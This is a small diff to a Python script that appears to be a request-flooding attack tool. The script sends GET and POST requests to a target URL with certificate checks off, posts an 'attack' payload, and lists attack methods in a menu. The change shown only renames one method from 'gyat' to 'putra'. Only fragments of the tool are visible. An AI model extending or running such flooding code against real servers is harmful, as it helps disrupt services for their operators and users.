@@ -32,7 +32,7 @@ def send_request(target_url, method):
             response = requests.get(target_url, headers=headers, timeout=5, verify=False)
         elif method == "r2":
             response = requests.get(target_url + "/r2", headers=headers, timeout=5)
-        elif method == "gyat":
+        elif method == "putra":
             response = requests.post(target_url, headers=headers, data={"gyat": "attack"}, timeout=5)
 
         print(f"{CYAN}[{method.upper()}]{RESET} Sent to {target_url} -> {RED}Status: {response.status_code}{RESET}")
@@ -90,7 +90,7 @@ def display_menu():
 4. {CYAN}TLS{RESET}
 5. {CYAN}HTTPS{RESET}
 6. {CYAN}R2{RESET}
-7. {CYAN}Gyat{RESET}
+7. {CYAN}Putra{RESET}
 """)
 
 # Menu utama
@@ -110,7 +110,7 @@ if __name__ == "__main__":
             "4": "tls",
             "5": "https",
             "6": "r2",
-            "7": "gyat"
+            "7": "putra"
         }
 
         method = methods.get(choice)
